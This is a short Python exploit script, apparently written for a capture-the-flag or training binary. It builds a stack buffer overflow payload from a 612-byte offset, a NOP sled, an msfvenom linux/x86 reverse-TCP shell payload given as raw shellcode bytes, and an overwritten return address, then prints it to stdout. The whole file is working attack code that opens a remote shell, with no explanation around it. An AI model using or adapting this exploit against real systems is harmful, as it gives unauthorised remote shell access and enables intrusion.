#!/usr/bin/env python3

#from pwn import *
import sys

#context.update(arch='i386', os='linux')

# WE can cause an overflow with 612 bytes + EIP
offset=612

# Let's choose local vs remote
#p = process("./training")
#p = remote("127.0.0.1", 4444)

#p.recvuntil("desert:")

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python -b '\x00\x0a\x0d'
# ...
# Payload size: 95 bytes
# Final size of python file: 479 bytes
buf =  b""
buf += b"\xbd\x92\x4a\xa8\x41\xdd\xc6\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x12\x83\xc2\x04\x31\x6a\x0e\x03\xf8"
buf += b"\x44\x4a\xb4\xcd\x83\x7d\xd4\x7e\x77\xd1\x71\x82"
buf += b"\xfe\x34\x35\xe4\xcd\x37\xa5\xb1\x7d\x08\x07\xc1"
buf += b"\x37\x0e\x6e\xa9\xb8\xf0\x90\x28\x2f\xf3\x90\x3b"
buf += b"\xf3\x7a\x71\x8b\x6d\x2d\x23\xb8\xc2\xce\x4a\xdf"
buf += b"\xe8\x51\x1e\x77\x9d\x7e\xec\xef\x09\xae\x3d\x8d"
buf += b"\xa0\x39\xa2\x03\x60\xb3\xc4\x13\x8d\x0e\x86"

# Payload: 
payload = b""
payload += b"\x90" * (offset - len(buf) - 30)
payload += buf
payload += b"\x90" * 30
payload += b"\xd8\xcc\xff\xff"

sys.stdout.buffer.write(payload)

